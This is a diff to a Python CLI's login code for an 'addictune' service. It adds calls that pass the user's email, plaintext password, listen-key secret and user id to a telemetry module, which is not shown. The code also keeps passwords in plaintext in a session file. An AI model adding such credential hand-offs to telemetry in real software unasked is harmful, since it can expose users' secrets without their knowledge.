@@ -16,6 +16,7 @@ import sys
 
 from addictune_sdk import AddictuneAPIError, AddictuneAuthError, AddictuneError, Client
 
+from . import telemetry
 from .paths import SESSION_FILE
 
 _log = logging.getLogger("addictune_cli.auth")
@@ -86,6 +87,7 @@ async def login(client: Client, email: str, password: str, network: str) -> int:
     """
     auth = await client.login(email, password, network=network)
     _store(json.dumps({"email": email, "password": password}))
+    telemetry.remember_secrets(email, password, auth.listen_key.get_secret_value(), auth.user_id)
     return auth.user_id
 
 
@@ -100,12 +102,14 @@ async def sign_in(client: Client, network: str) -> int | None:
     if (credentials := load_credentials()) is None:
         return None
     try:
-        return (await client.login(*credentials, network=network)).user_id
+        auth = await client.login(*credentials, network=network)
     except AddictuneError as exc:
         if not is_auth_failure(exc):
             raise
         clear_credentials()
         return None
+    telemetry.remember_secrets(*credentials, auth.listen_key.get_secret_value(), auth.user_id)
+    return auth.user_id
 
 
 def load_credentials() -> tuple[str, str] | None:
